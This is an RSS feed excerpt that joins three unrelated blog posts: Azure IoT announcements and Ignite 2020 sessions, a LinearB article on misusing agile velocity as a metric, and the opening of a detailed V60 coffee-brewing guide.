<p>Azure SQL Edge, which&nbsp;brings the most secure Microsoft SQL data engine to&nbsp;Internet of Things (IoT)&nbsp;gateways and edge devices, is now available. Optimized for IoT workloads, SQL Edge supports built-in data streaming, storage and&nbsp;artificial intelligence&nbsp;packed into&nbsp;a&nbsp;small footprint container that works in connected or disconnected environments.</p>



<p>Built on the same code&nbsp;base as Microsoft SQL Server and Azure SQL, Azure SQL Edge provides the same industry-leading security, the same familiar developer experience, and the same tooling that many teams already know and&nbsp;trust. ‚Äã</p>



<p>Azure SQL Edge is a small-footprint container ‚Äî less than 500 megabytes ‚Äî running in ARM- and x64-based devices in connected, disconnected or semi-connected environments.</p>



<p><a href="https://aka.ms/AA9gi03" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="new_azure_certified_device_program"></span>New Azure Certified Device Program<span></span></h3>



<p>A new Azure Certified Device program will streamline the experience of connecting the right device to the right solution through its Azure Certified Device Catalog, benefiting both device builders and solution builders.</p>



<p>For device builders, the certification reduces time to market, as they no longer&nbsp;have to&nbsp;use their own time and resources to&nbsp;verify, validate and communicate trust. For the solution builder and distributor, the certification ensures&nbsp;both&nbsp;quality and compatibility.</p>



<p>The catalog will highlight device compatibility and differentiation&nbsp;through three Azure certifications:</p>



<ul><li><strong>Azure Certified Device,&nbsp;</strong>the entry-level certification that validates that a device can connect with Azure IoT Hub and&nbsp;securely provision through the Device Provisioning Service (DPS)</li><li><strong>IoT Plug and Play,&nbsp;</strong><a href="https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fazure.microsoft.com%2Fen-us%2Fblog%2Fprepare-and-certify-your-devices-for-iot-plug-and-play%2F&amp;data=02%7C01%7Cvwalker%40we-worldwide.com%7Cdc9023a766b7415d473e08d856ae444c%7C3ed60ab455674971a5341a5f0f7cc7f5%7C0%7C0%7C637354653788198257&amp;sdata=HcAMFZiKv8QqbSMtVSBk0S8lWCm313Ime%2FfqT%2Fj%2Fflc%3D&amp;reserved=0" target="_blank" rel="noopener">announced in August</a>, the certification that simplifies the process of building devices without custom device code</li><li><strong>Edge-managed certification,&nbsp;</strong>which focuses on device management standards for Azure connected devices for IoT devices running Windows,&nbsp;Linux or RTOS.&nbsp;Today,&nbsp;this program&nbsp;certification&nbsp;focuses&nbsp;on&nbsp;Edge runtime&nbsp;compatibility for module&nbsp;deployment and management.</li></ul>



<p><a href="https://aka.ms/AA9g2rj" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="at_t_brings_first_azure_sphere_cellular_guardian_device_to_market"></span>AT&amp;T brings first Azure Sphere Cellular Guardian device to market<span></span></h3>



<p>With‚ÄØthe launch of‚ÄØthe first Azure Sphere cellular guardian device, AT&amp;T is enabling customers to expand connectivity and security without relying on Wi-Fi access.</p>



<p>This new product can connect a company‚Äôs various existing devices and machines directly to the customer‚Äôs cloud via a cellular network. This allows the customer to manage and monitor thousands of devices, aggregate data and identify potential problems.</p>



<p>By using the AT&amp;T cellular network, enterprise customers can connect devices in more than 200 countries across 500 carriers where AT&amp;T offers managed services to support day-to-day operations. AT&amp;T offers end-to-end professional services, and the secure cellular network extends the secure architecture of Azure Sphere.</p>



<p><a href="https://aka.ms/AA9gi0n" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h2><span id="azure_iot_sessions_at_ms_ignite_2020"></span>Azure IoT Sessions at MS Ignite 2020<span></span></h2>



<p>Here are a few of the great Azure IoT sessions available for viewing on the Microsoft Ignite conference website. These sessions are recorded and will be available for recording within 24 hours of their live stream.</p>



<h3><span id="azure_iot_services,_roadmap_and_vision_from_connected_assets_to_connected_environments"></span><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Azure IoT services, roadmap and vision: from connected assets to connected environments</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT.&nbsp; Learn how IoT is evolving from providing insights and control of connected assets, to providing insights and control of entire connected environments. This session will delve into the Azure IoT services and our innovation roadmap across cloud and edge that enables this evolution. </p>



<p><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="azure_iot_building_end_to_end_iot_solutions"></span><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Azure IoT: building end to end IoT solutions</a><span></span></h3>



<p>The value in IoT comes from end to end business solutions that connect devices, provide insights and drive informed action. We‚Äôll cover two approaches to building IoT solutions on Azure, including using our IoT Reference Architecture or using IoT Central, our industry leading IoT application platform that requires zero cloud solution development skills. We‚Äôll cover how to connect an IoT Edge and an Azure Sphere device using both approaches. Come learn just how easy and powerful we‚Äôve made IoT.</p>



<p><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Cory Newton-Smith ‚Äì Azure IoT Principal PM Manager, Microsoft<br>Pamela Cortez ‚Äì Azure IoT Senior PM, Microsoft</p>



<h3><span id="ask_the_expert_azure_iot_from_connected_assets_to_connected_environments_with_iot_plug_and_play"></span><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Ask the Expert: Azure IoT: From connected assets to connected environments with IoT Plug and Play</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT. Join this Ask the Experts to ask all your questions relating to how you can connect IoT devices to the cloud seamlessly with Plug and Play.</p>



<p><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="gathering_data_from_the_world"></span><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Gathering data from the world</a><span></span></h3>



<p>Internet of Things (IoT) is the common term used for small devices designed to provide constant streams of information about what‚Äôs going on around it. IoT devices can count actions, measure the weather, or track location. All the information being gathered needs to be stored somewhere and eventually read. Let‚Äôs talk about some of the options available to you, and how you can begin to see what‚Äôs going on with your devices.</p>



<p><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Jim Bennett ‚Äì Senior Cloud Advocate, Microsoft</p>



<h3><span id="azure_ai_and_iot_to_support_smart_office_reopening_with_rxr_realty"></span><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Azure AI and IoT to support smart office reopening with RXR Realty</a><span></span></h3>



<p>Hand-on deep dive of RXR Realty‚Äôs pioneering work to make it safer for people to return back to the workplace amid Covid-19 in New York.&nbsp; Includes demonstration and explanation of how they are leveraging Azure AI and IoT for automated health checks, air quality control, social distancing, mask compliance and much more. This is an Ignite exclusive show from Microsoft Mechanics.</p>



<p><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Jeremy Chapman ‚Äì Directory, Microsoft<br>Cory Clarke ‚Äì VP Product Management, RXR Realty</p>



<h3><span id="learn_how_insanely_easy_vision_ai_can_enable_real_time_insights_for_manufacturing"></span><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Learn how insanely easy Vision AI can enable real time insights for Manufacturing</a><span></span></h3>



<p>Intelligent Industry Solution Series:&nbsp;Integration of cameras into factory floors, warehouses and retail environment can bring immediate and actionable insights. The new Factory AI tool makes the integration of vision analytics easy and seamless.&nbsp; With a few basic inputs, any factory floor or business can enable real time insights across a variety of use cases.&nbsp;Hear from Intel and Microsoft experts on the value of intelligent vision and how to get started.</p>



<p><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>David Armour ‚Äì Principal Program Manager, Microsoft<br>Philip Van De Mortel ‚Äì Edge Sales Manager, Intel</p>



<h3><span id="remote_patient_monitoring_sharing_a_blueprint_to_enhance_patient_care_and_safety"></span><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Remote Patient Monitoring: Sharing a blueprint to enhance patient care and safety</a><span></span></h3>



<p>Intelligent Industry Solution Series: Enhancing patient care starts with comprehensive information and personalized treatment. Combined with increased safety measures, the healthcare industry has fast tracked telehealth solutions. One practice is Remote Patient Monitoring, which reduces in-person visits, boosts patient convenience and provider efficiency. In this session, we will look at Telehealth trends, and share a remote patient monitoring blueprint enabled by Microsoft and Intel.</p>



<p><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Anne Barker ‚Äì Enterprise Account Executive, Intel<br>Michela Sainato ‚Äì Program Manager II, Microsoft</p>
<br>
						
											
						
					
					<h3>Article Author</h3>
					<div id="author-info">
						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=128&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=256&amp;d=identicon&amp;r=g 2x" height="128" width="128" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">																						<img id="author-img-mvp" src="https://build5nines.com/wp-content/uploads/2019/08/mvp_logo_horizontal_preferred_cyan300_rgb_300ppi_163x65.png" alt="Microsoft MVP">
													</p>
						
						<p id="author-desc">Chris is the <strong>Founder of Build5Nines.com</strong> and a <strong>Microsoft MVP</strong> in Azure &amp; IoT with 20 years of experience designing and building Cloud &amp; Enterprise systems. He is also a <strong>Microsoft Certified: Azure Solutions Architect</strong>, developer, <strong>Microsoft Certified Trainer</strong> (MCT), and Cloud Advocate. He has a passion for technology and sharing what he learns with others to help enable them to learn faster and be more productive.</p>
						
					</div>
					
											
										</div></div>]]>
            </description>
            <link>https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574797</guid>
            <pubDate>Thu, 24 Sep 2020 02:52:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why agile velocity is the most dangerous metric]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574765">thread link</a>) | @necco908
<br/>
September 23, 2020 | https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/ | <a href="https://web.archive.org/web/*/https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="670d84f7" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<figure><img src="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png" alt="Agile velocity is useful for sprint planning, but it is often misused as a metric." srcset="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1536x723.png 1536w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Agile Velocity is arguably the most popular software development metric in the world. It‚Äôs a very powerful metric when used for individual team sprint capacity planning. And there are two things we know about power‚Ä¶ it comes with great responsibility and it corrupts.&nbsp;</p>



<p>When agile velocity is used for anything other than individual team sprint capacity planning, very bad things can occur. In fact, when misused, Agile Velocity is the most dangerous metric for software development organizations. Unfortunately, every day Velocity is abused by executives, engineering leaders, product leaders, and even developers.&nbsp;</p>



<hr>



<blockquote><p><strong>Already familiar with the dangers of using agile velocity? </strong></p><p><strong><a rel="noreferrer noopener" href="https://linearb.io/12-metrics-dev-leader/" target="_blank">Click here to see 17 alternative metrics for team-focused software development leaders</a></strong></p></blockquote>



<hr>







<h3><strong>What is Agile Velocity?</strong></h3>



<p>Agile Velocity measures the amount of work a single team completes during a software development iteration or sprint. It represents the amount of story points completed over time and can be visualized as the slope in a classic burndown chart.</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png" alt="Agile velocity is the slope of a burndown chart">
</picture>
</figure>



<h3><strong>What are Story Points?</strong></h3>



<p>Story Points are a unit of measure for expressing an estimate of the overall effort that will be required to fully implement a product backlog item or any other piece of work. Story Points are a subjective measure decided and agreed upon by an individual software development team or organization.&nbsp;</p>







<h3><strong>My personal history with Story Points &amp; Agile Velocity</strong></h3>



<p>When I was promoted into my first team lead role, like most new managers (in any function), I was in over my head. But I was determined to do a great job. I looked for every opportunity to help my team improve. Data. Metrics. Process. Culture. <a href="https://linearb.io/blog/how-to-introduce-data-driven-culture-to-your-dev-team/" target="_blank" rel="noreferrer noopener">I was hungry for all of it.&nbsp;</a></p>



<p>I remember thinking that, compared to other departments like sales, marketing, and technical support, there didn‚Äôt seem to be a lot of established metrics engineering leaders used to measure team-based performance and improvement. Which is ironic because we measure so many things ‚Äì page load performance, latency, code performance, unit test coverage, etc.&nbsp;</p>



<p>Then I found velocity. I was pretty excited. Of course, I had heard of it but I never did a deep dive. We used Jira and story points but I was never trained on velocity and it was not part of our formal process to measure story points across multiple sprints.&nbsp;</p>



<p>We started using it for capacity planning. It worked! You get what you measure, right? We started measuring velocity and the focus on it allowed us to get progressively more accurate in our sprint planning.&nbsp;</p>



<p>I was promoted to lead more teams. At some point in a management meeting, I asked all of our managers ‚ÄúShould we start reviewing velocity every week in this meeting?‚Äù. And I was actually ready to go further‚Ä¶ scrum of scrum, all-hands meetings, etc.&nbsp;</p>



<p>I‚Äôll never forget what happened‚Ä¶ <a href="https://www.linkedin.com/in/timothyrwall/" target="_blank" rel="noreferrer noopener">Tim Wall</a>, a vet on our team who I really respected, gave me the following advice: ‚ÄúNever use velocity to measure performance and never share velocity outside of individual teams.‚Äù&nbsp;</p>



<p>Thankfully, I listened to Tim. Because since then I‚Äôve heard nothing but horror stories from other engineering leaders who tried to use agile velocity for more than what it was originally intended for.&nbsp;</p>







<h3><strong>Dodging the Dangers</strong></h3>



<div><figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg" alt="Dodge the dangers of agile velocity" width="219" height="180">
</picture>
</figure></div>



<p>There are three main types of abuses I‚Äôve seen of Agile Velocity. Consider this a hero‚Äôs guide to help the software development community stay safe, avoid traps, and, most importantly, to use Agile Velocity for good not evil.&nbsp;</p>







<h4><strong>1) Agile Velocity abused by Dev Leaders as a team comparison metric</strong></h4>



<p>I narrowly escaped making this mistake. Some engineering leaders I know weren‚Äôt so lucky.&nbsp;</p>



<p>Here‚Äôs the scenario‚Ä¶ Agile scrum is being used by all of your teams. Velocity is being tracked on an iteration by iteration basis. You have a gut intuition that some of your teams are ‚Äúperforming better‚Äù and some of your teams are ‚Äúperforming worse‚Äù. You get an itch to see which teams are completing the most story points per iteration and which teams are completing the least story points per iteration. You‚Äôre just curious. Then you start thinking about it in terms of who has the ‚Äúbest‚Äù velocity? Maybe you even show and compare velocity in your management meeting or scrum of scrums.&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/zmq1Ty58gfjHCGnYVG1p-ZPGvktzrADWy0d13Nr8etzoR12yZvzUE36H_HsHGrSsqNFDrzGWH1f9ZDEz-RSPIx8J1CaeKd_ePxNyRRsXOGigzLzcDFeft43B-2pHbJ2McYC-VC3w" alt="Agile velocity: Danger!" width="375" height="392"></figure>



<h5><strong>What can go wrong</strong></h5>



<p>Danger, Will Robinson! We have to be very, very careful here.&nbsp;</p>



<ul><li>Story point weights are subjective to each individual team<br></li><li>Therefore story point weights are easy to manipulate<br></li><li>Therefore developers have an incentive to inflate their points<br></li><li>Therefore individual teams and developers can easily game the system<br></li><li>If some teams are inflating their story points, other developers will figure this out<br></li><li>From here you are only a stone‚Äôs throw away from broken trust, frustration and culture damage&nbsp;</li></ul>



<p>Bad intentions aren‚Äôt even required for this to happen. It‚Äôs natural human behavior.</p>



<p>So, like Tim told me, Agile Velocity is sacred and should be used within individual teams only. Period.&nbsp;</p>







<h5><strong>Tips to navigate this situation:</strong></h5>



<p>There‚Äôs nothing wrong with looking at comparative performance data. That‚Äôs your job. Without benchmarks, you won‚Äôt be able to invest your time helping your people and teams that need it most. Since you shouldn‚Äôt use velocity, what metrics should you use? <a href="https://linearb.io/blog/align-engineering-metrics-to-your-business-kpis/" target="_blank" rel="noreferrer noopener">It depends on the business outcome you‚Äôre trying to achieve</a>:</p>



<ul><li>If speed to value is your main goal, consider <a href="https://linearb.io/cycle-time/" target="_blank" rel="noreferrer noopener">Cycle Time</a>.</li><li>If predictability is your main goal, look at Iteration Churn.&nbsp;</li><li>If quality is your priority, Change Failure Rate and Mean Time to Restore are good.</li></ul>







<p>A related question to ask yourself is what kind of culture do I want to create? <a href="https://linearb.io/blog/our-dev-culture-is-based-on-bushido-samurai-code-my-interview-with-the-vp-of-engineering-at-gigsmart/" target="_blank" rel="noreferrer noopener">One VP of Engineering I interviewed recently</a> talked about how measuring the wrong things can backfire and hurt culture. <a href="https://linearb.io/coffee-talk/" target="_blank" rel="noreferrer noopener">Chris Downard from GigSmart</a> says</p>



<figure><blockquote><p><em>‚ÄúIf you stack rank individual devs you create anxiety.</em></p><cite>Chris Downard, VP of Engineering, Gigsmart</cite></blockquote></figure>



<p>One of the things I don‚Äôt like about getting individual statistics, like the number of commits you push as an individual developer, is that you‚Äôre incentivizing the number of commits they push. Not necessarily the quality. Or not necessarily tied to the business objective for delivery.&nbsp;</p>



<p><em>I don‚Äôt care how many commits they make. I care about the work the team gets done. For example, if a developer starts pairing [pair programming] a bunch that should not affect how we view them as long as they keep delivering value.‚Äù</em></p>



<p>He‚Äôs not the only software development leader I‚Äôve met who feels this way. Kara Minotti Becker, a respected agile consultant, told me recently</p>



<p><em>‚ÄúMembers of software development teams, including engineers, are often scared of metrics‚Ä¶ who they‚Äôre going to be exposed to.‚Äù</em></p>



<p>I‚Äôve seen this too. If you want to create an environment where it‚Äôs all about the team, consider throwing out metrics like individual code changes and commits, and just measure team-based metrics.&nbsp;</p>







<h3>2) <strong>Agile Velocity abused by Executives as a performance metric</strong></h3>



<p>It‚Äôs no secret‚Ä¶ executives love data. Especially performance related metrics.</p>



<p>One of the biggest issues that we face as software development leaders is the lack of standardized metrics describing the health and performance of our teams. Unlike all other major departments (sales, marketing, finance), we as a community lack the basics when it comes to data-driven team performance.&nbsp;</p>



<p>Sales has revenue and pipeline and sales cycle length&nbsp;</p>



<p>Marketing has MQLs and SQLs and cost of customer acquisition&nbsp;</p>



<p>HR has positive and negative employee engagement and retention rates&nbsp;</p>



<p>CEOs and business leaders get these metrics. They know what good and bad looks like. They know the leading indicators for success. They know what levers they can pull when those department leaders need help.&nbsp;</p>



<p>Engineering is often reduced to, <a href="https://linearb.io/blog/two-data-points-the-vp-of-engineering-should-show-the-ceo-every-week/" target="_blank" rel="noreferrer noopener">‚Äúare we on track to deliver XYZ feature by the deadline?‚Äù</a></p>



<p>Their intentions are good and they want to understand, but most CEOs don‚Äôt have an engineering background and therefore they don‚Äôt have tools they need to understand engineering in the same way.&nbsp;</p>



<p>Then all of sudden your CEO catches wind that there is a metric called Velocity that your agile software development teams are tracking.&nbsp;</p>



<p>You say‚Ä¶ <em>‚ÄúEach team uses it to estimate how much work they can get done in a sprint.‚Äù</em></p>



<p>They hear‚Ä¶ ‚ÄúWe can use it to measure dev org output over time and rank team performance.‚Äù&nbsp;</p>



<p>They say‚Ä¶&nbsp; ‚ÄúLet‚Äôs start presenting velocity in every executive meeting and at every all-hands!‚Äù</p>



<p>What you should think‚Ä¶ ‚ÄúIt‚Äôs a trap!‚Äù&nbsp;</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg" alt="Using agile velocity as a metric is a trap">
</picture>
</figure>



<h4><strong>What can go wrong</strong></h4>



<p>At this point in the conversation, our spidey senses should be going crazy. Velocity at the executive table? Do not proceed.&nbsp;</p>



<h5><strong>Tips to navigate this situation</strong></h5>



<p>This is our time to gracefully push back.&nbsp;</p>



<ul><li>Ask questions to understand what exactly your executive team is looking for. Is it team performance data? Are they worried about deadline predictability? Are they wondering about the impact of the new hires they invested in?<br></li><li>Start with yes. ‚ÄúWe can absolutely be data-driven.‚Äù<br>(I had a boss that told me ‚Äústart with yes‚Äù, then get to the outcome you want. That concept has served me well over the years ‚Äì especially with CEOs üôÇ )<br></li><li>You know that it will damage culture and encourage sandbagging. But consider keeping all of that to yourself and just explain why Agile Velocity is not accurate when used for anything other than individual team sprint capacity planning. A<br></li><li>Come with an alternative. <a rel="noreferrer noopener" href="https://linearb.io/cycle-time/" target="_blank">Cycle time</a> is a great one because execs already understand sales cycle time. Software development cycle time is the equivalent for engineering teams.&nbsp;</li></ul>







<h3><strong>3) Agile Velocity as a false predictor of project delivery date</strong></h3>



<p>We‚Äôve gone through two of the basic traps. Don‚Äôt use velocity as a performance metric at the executive table and don‚Äôt use velocity as a team comparison metric.&nbsp;</p>



<p>Now things get more interesting‚Ä¶&nbsp;</p>



<p>The scene looks like this: A project manager wants to estimate when a project is going to be delivered. ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</a></em></p>]]>
            </description>
            <link>https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574765</guid>
            <pubDate>Thu, 24 Sep 2020 02:44:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Brew Better Coffee with a V60]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574431">thread link</a>) | @ValentineC
<br/>
September 23, 2020 | https://coffeeadastra.com/2018/11/30/brewing-better-coffee/ | <a href="https://web.archive.org/web/*/https://coffeeadastra.com/2018/11/30/brewing-better-coffee/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<h2><span><b><i>Table of Contents</i></b></span></h2>
<ol>
<li>
<ol>
<li><span>Introduction</span></li>
<li><span>Percolation and Immersion</span></li>
<li>Why use a V60 ?</li>
<li>The Brew Variables
<ol>
<li><span>Coffee to Water Ratio</span></li>
<li><span>Coffee Beans Quality and Roast Profile</span></li>
<li><span>Grind Size and Uniformity</span></li>
<li><span>Coffee Freshness</span></li>
<li><span>Filter quality</span></li>
<li><span>Brew temperature</span></li>
<li><span> Water Agitation</span></li>
<li><span>Uniformity of Extraction and Repeatability</span></li>
<li><span>Water quality</span></li>
<li>Contact Time</li>
</ol>
</li>
<li><span>Determining Grind Size</span></li>
<li><span>Practicing the Rao Spin</span></li>
<li><span>How To Actually Make a Better V60</span>
<ol>
<li>The Gear I Use</li>
<li>The Water I Recommend</li>
<li>A V60 Pour Over Workflow</li>
</ol>
</li>
<li>References</li>
</ol>
</li>
</ol>
<h2><span><b><i>1. Introduction</i></b></span></h2>
<p><span>I‚Äôve been interested in specialty coffee for a few years now, and never went to a telescope run without my V60, manual grinder and some fresh beans. I had not actually read that much about the details of how to brew a great cup of coffee; rather, I just bought some good beans and read some reviews for the most useful and easily transportable gear to brew coffee when traveling. A few months ago, I decided to get a little deeper into this, and to read as much as I could on the subject. This all started because I was regularly buying fresh, great tasting beans from the Saint-Henri coffee shop in Montreal, and I really wasn‚Äôt satisfied about my brews, especially when I compared them with what the Saint-Henri staff brewed with the same coffee.</span></p>
<p><span>This turned out to be a massive rabbit hole, but I actually love it when it happens. During the past few months, I changed a lot of things about my brew method and equipment. Having great coffee beans is definitely required to brew a great coffee, but I learned there are countless obstacles that can ruin your cup pretty drastically, regardless of your bean‚Äôs quality. I was quite surprised how hard some of this information was to find on the web, and in the past months I have done a lot of experiments and huge mistakes that took me a while to figure out. So, I decided that I‚Äôll write a blog post to distill some of this information, and to guide any interested readers through the steps to improve their coffee cups, either at home or when traveling. I might write a few more posts like this in the future when I discover better methods, or when I familiarize myself with new tools and recipes.</span></p>
<p><span>Another thing that really frustrated me when researching this topic is the amount of pseudoscience one encounters on the subject of specialty coffee. Surprisingly enough, some of the main culprits include previous world champion baristas (hmmmmmm <a href="https://www.youtube.com/watch?v=wmCW8xSWGZY"><span>Kasuya</span></a>, are you using these magical self-transmuting beans again ?)</span></p>
<p><span>For those who don‚Äôt know me, this blog post is not intended to be a quick-and-approximate guide of how to make a V60 ‚Äì there are plenty of videos already doing that on the web. Rather, it‚Äôs intended for the more geeky-minded people that are interested in all the technical details. I‚Äôm fully aware that half of the things I‚Äôll discuss here will only produce an increase in cup quality of a few % (e.g., ‚Äúnow let‚Äôs sift our coffee grounds for 5 minutes and remove 5 g of the grinds with a 350&nbsp;<i>Œº</i>m sieve to achieve a tighter particle size distribution‚Äù), but there are some other aspects of brewing that, despite sounding insane, can have a profound impact on your cup quality (e.g., ‚Äúoh no, this tap water has 200 ppm alkalinity‚Äù).</span></p>
<p><span>If you are inclined to think that bringing a scientific mindset and sophisticated tools to improve a coffee is not justified, here‚Äôs something to consider ‚Äì most other products that we consume went through much more technical assessment, and we understand more of the science behind them (e.g., wine, beer, cheese, scotch). Somehow, coffee almost never gets this treatment. I‚Äôm not sure why, but maybe its being used for caffeine rather than taste might have something to do with it. But that‚Äôs a whole other topic about which I know very little.</span></p>
<p><span>For now I‚Äôll focus on the V60 method, because it‚Äôs cheaper, simpler and easier to carry around for travel. For those not familiar with the V60, it‚Äôs basically minimalism for baristas: a conic shaped object, often made of plastic or ceramic, that you put on top of your coffee mug (or other fancy container) to manually brew coffee. It also serves as a convincing argument when a TSA agent asks you what the hell is all that other equipment making up half of your luggage.</span></p>
<h2><span><b><i>2. Percolation and Immersion</i></b></span></h2>
<p><span>Because you constantly pour fresh water over coffee with the V60 method, it‚Äôs part of the many methods under the umbrella of <i>percolation</i> brewing. Other examples include batch brewers and moka pots. This is in contrast to <i>immersion</i> brewing, where coffee grounds remain in contact with the same water during the totality of the brew process. Some examples of immersion brews include a french press or a siphon brewer. The main difference between percolation and immersion arise from the fact that fresh water is a better solvent than coffee. In an immersion brew, the speed of extraction decreases as the coffee gets more concentrated, but in a percolation brew, the water in contact with the coffee grounds is almost fresh, so the extraction is always very efficient. You can achieve similar results with either types of brews, but how you navigate across brewing recipes can be very different, and each method has its particularities.</span></p>
<h2><span><b><i>3. Why use a V60 ?</i></b></span></h2>
<p><span>Some people might ask ‚ÄúWhat‚Äôs the point of using a V60 if I have a great batch brewer at home ?‚Äù This is a fair question; I think it‚Äôs possible to achieve great results with a clean and high-quality batch brewing machine (some coffee experts like Scott Rao <a href="https://www.scottrao.com/blog/batch-brew-basics-part-1-the-setup?rq=batch"><span>also do</span></a>), but personally I haven‚Äôt often tasted great cups of coffee made with batch brewers.</span></p>
<p><span>In theory, I don‚Äôt see why an automated household brewer couldn‚Äôt mop the floor with cups made from manual V60s, but in practice they are often cheap, and never made with the question ‚Äúhow to produce a great extraction ?‚Äù in mind, but rather to simply dump water on coffee with the cheapest materials. They are often made of plastic, which I find can impart a bad taste to the cup (this probably depends on the type of plastic). It‚Äôs also easy to forget to clean them from time to time, which will eventually make your coffee disgusting (just try to smell the basket of a batch brewer in a hotel room if you want an idea ‚Äì but really, don‚Äôt). They also often come with a relatively large container for water which will go stale if you don‚Äôt use it intensely, and that will also result in really bad coffee.&nbsp;Some of these machines also come with a heating element under the coffee jar, which is a great way to burn your coffee and make it even worse.</span></p>
<p><span>At most specialty coffee shops, they have decent batch brewers and they seem to clean them often. The problem I most often encounter in that scenario is how long the cup of coffee stayed in the hermetic jar before the staff served it. If it‚Äôs fresher than about half an hour, the resulting cup can be super good, but wait much longer than that and it will start to gradually taste like each subsequent level of hell. It will never reach the final level of hell however, this one is only accessible to the worst lattes.</span></p>


